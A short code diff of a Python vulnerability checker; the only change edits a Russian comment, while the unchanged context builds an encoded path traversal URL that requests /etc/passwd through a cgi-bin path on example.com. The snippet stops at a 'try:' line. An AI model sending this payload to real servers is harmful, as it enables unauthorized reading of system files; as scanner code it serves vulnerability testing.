@@ -1,7 +1,7 @@
 import requests
 
 def check_vulnerability():
-    # Формируем уязвимый URL с использованием техники path traversal
+    # Формируем уязвимый URL с использованием path traversal
     target_url = "http://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 
     try:
